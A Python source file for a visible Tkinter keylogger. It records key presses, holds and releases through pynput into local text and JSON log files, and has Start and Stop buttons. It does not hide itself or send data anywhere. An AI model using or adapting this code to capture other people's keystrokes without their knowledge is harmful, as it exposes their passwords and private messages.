from tkinter import CENTER as _CENTER
from tkinter import RIGHT as _RIGHT
from tkinter import LEFT as _LEFT
from tkinter import Tk as _Tk
from tkinter import Button as _Button
from tkinter import Label as _Label
from pynput import keyboard as _keyboard
from typing import Any as _Any
from datetime import datetime as _dt

from json import dumps as _dumps

keys_used: list | None = []
flag: bool = False
keys: str = ""
now: _dt = _dt.now()


def generate_text_log(key: _Any) -> None:
    """
    Generates a text log file containing the recorded keystrokes.

    Args:
        key (Any): The keystroke data to write into the log file.
    """

    with open("./out/key_log.txt", "w+") as KEYS:
        KEYS.write(key)


def generate_json_file(used_keys: _Any) -> None:
    """
    Generates a JSON log file with keystroke events.

    Args:
        used_keys (Any): A list of key events to log in JSON format.
    """

    with open("./out/key_log.json", "+wb") as key_log:
        key_list_bytes = _dumps(used_keys).encode()
        key_log.write(key_list_bytes)


def on_press(key: _Any) -> None:
    """
    Handles key press events, logging the pressed or held keys.

    Args:
        key (Any): The key that was pressed.
    """

    global flag, keys_used, keys
    if not flag:
        keys_used.append({"Pressed": f"{key}"})
        flag = True

    if flag:
        keys_used.append({"Held": f"{key}"})
    generate_json_file(keys_used)


def on_release(key: _Any) -> None:
    """
    Handles key release events and updates log files.

    Args:
        key (Any): The key that was released.
    """

    global flag, keys_used, keys
    keys_used.append({"Released": f"{key}"})

    if flag:
        flag = False
    generate_json_file(keys_used)

    keys = keys + str(key)
    generate_text_log(str(keys))


_LISTENER = _keyboard.Listener(on_press=on_press, on_release=on_release)


def start_keylogger():
    """
    Initiates the keylogger, enabling keystroke logging.
    """

    listener = _LISTENER
    listener.start()
    label.config(
        text="[+] Keylogger is running!\n[!] Saving the keys in 'keylogger.txt'"
    )
    start_button.config(state="disabled")
    stop_button.config(state="normal")


def stop_keylogger():
    """
    Stops the keylogger, halting keystroke logging.
    """

    listener = _LISTENER
    listener.stop()
    label.config(text="Keylogger stopped.")
    start_button.config(state="normal")
    stop_button.config(state="disabled")


if __name__ == "__main__":
    root = _Tk()
    root.title("Keylogger")

    label = _Label(root, text='Click "Start" to begin key logging...')
    label.config(anchor=_CENTER)
    label.pack()

    start_button = _Button(root, text="Start", command=start_keylogger)
    start_button.pack(side=_LEFT)

    stop_button = _Button(root, text="Stop", command=stop_keylogger, state="disabled")
    stop_button.pack(side=_RIGHT)

    root.geometry("250x250")

    root.mainloop()
